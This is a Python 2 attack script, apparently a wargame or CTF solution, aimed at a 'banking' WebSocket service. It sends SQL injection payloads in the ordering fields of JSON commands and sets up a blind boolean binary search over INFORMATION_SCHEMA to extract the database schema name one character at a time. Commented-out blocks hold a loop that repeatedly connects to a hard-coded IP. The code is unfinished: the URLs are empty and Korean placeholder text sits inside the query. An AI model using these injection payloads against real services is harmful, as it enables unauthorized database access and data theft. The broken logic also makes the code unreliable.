'''
from socket import *
from time import sleep
from win32api import Sleep

__author__ = 'grace'


try:
    for x in range(999):

        clientsock = socket(AF_INET, SOCK_STREAM)
        clientsock.settimeout(10)
        clientsock.connect(('192.168.32.140',8080))
        clientsock.send(">&"+str(x))
        Sleep(10)
        clientsock.close()

except:
    print "insert Socket Error!!"
'''
from time import sleep

'''
import websocket, httplib, sys, asyncore
def connect(server, port):

    print("connecting to: %s:%d" %(server, port))

    conn  = httplib.HTTPConnection(server + ":" + str(49080))
    conn.request('POST','/banking/')
    resp  = conn.getresponse()
    hskey = resp.read().split(':')[0]
    print 'ws://'+server+':'+str(port)+'/banking'
    ws = websocket.WebSocket(
        'ws://'+server+':'+str(port)+'/banking',
        #onopen   = _onopen,
        #onmessage  = _onmessage,
        #onclose = _onclose
    )
    ws.close=_onclose

    return ws

def _onopen():
    print("opened!")

def _onmessage(msg):
    print("msg: " + str(msg))

def _onclose():
    print("closed!")


if __name__ == '__main__':

    server = '1.234.27.139'
    port = 38088

    ws = connect(server, port)

    try:
        asyncore.loop()
    except KeyboardInterrupt:
        ws.close()
'''

'''
stat

"isTrue"
"isFalse"


'''

import websocket
import thread
import time

global flag
global query
global stat
global result

global row
global pos
global prev
global curValue
global min
global max
global values

flag=False
stat="start"

row = 0
pos = 0
curValue = 0
prev = True
min = 999
max = 0
values = ""

def on_message(ws, message):
    global flag
    global result
    flag=True
    print message

    if message.find("abiabi") != -1:
        result = True
    if message.find("jikim") != -1:
        result = False
    if message.find("abiabi") != -1 and message.find("jikim") != -1:
        print "True, False error!!"
    main()

def on_error(ws, error):
    global flag
    flag=True
    print error
    main()

def on_close(ws):
    global flag
    flag=True
    print "### closed ###"
    main()

def on_open(ws):
    global flag
    def run(*args):
        global flag
        #ws.send('{"cmd":"list_init","o":"balance","b":"desc limit 1 -- a "}')
        ws.send('{"cmd":"list_init","o":"balance","b":"asc,IF((1=1),user,balance) asc limit 0,2"}')
        time.sleep(3)
        ws.close()
    flag=False
    thread.start_new_thread(run, ())
    # while not flag:
    #     print 1
    #     sleep(1)
    # flag=False
    # thread.start_new_thread(run, ())
    # while not flag:
    #     print 2
    #     sleep(1)

isTrueQuery="1=1"
isFalseQuery="1=2"

def ready():
    global query
    global stat
    global result
    global row
    global pos
    global prev
    global min
    global max
    global values
    global curValue

    if stat=="start":
        stat="isTrue"
    elif stat=="isTrue":
        if result != "True":
            print "isTrue Value Error!"
        else:
            stat="isFalse"
    elif stat=="isFalse":
        if result != "False":
            print "isFalse Value Error!"
        else:
            stat=""

    if result == False:
        if pos==0 and curValue==0:
            print "End of Length"
            exit
        elif max<=min+1:
            print "find OK![",max,"]",chr(max)
            values += chr(max)
        else:
            max = curValue-1
            curValue = (max+min)/2

    query="Ascii(Substr((SELECT TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES limit 0,1),대입값,1))=대입값"




    #
    # # is true?
    # stat="isTrue"
    #
    #
    # stat="isFalse"


def main():
    #websocket.enableTrace(True)
    ready()
    ws = websocket.WebSocketApp("ws://:/banking",
                                on_message = on_message,
                                on_error = on_error,
                                on_close = on_close)

    ws.on_open = on_open

    ws.run_forever()

main()
#
# import websocket
# import thread
# import time
#
# def on_message(ws, message):
#     print message
#
# def on_error(ws, error):
#     print error
#
# def on_close(ws):
#     print "### closed ###"
#
# def on_open(ws):
#     print 1
#     def run(*args):
#         ws.send('{"cmd":"list_init","o":"(case when 1 then balance else user end)","b":" asc limit 1 -- a "}')
#         #ws.send('{"cmd":"list_init","o":"balance","b":"desc limit 1 -- a "}')
#         time.sleep(10)
#         ws.close()
#         print "thread terminating..."
#     thread.start_new_thread(run, ())
#
#
# if __name__ == "__main__":
#     websocket.enableTrace(True)
#     ws = websocket.WebSocketApp("ws://:/banking",
#                                 on_message = on_message,
#                                 on_error = on_error,
#                                 on_close = on_close)
#     ws.on_open = on_open
#
#     ws.run_forever()
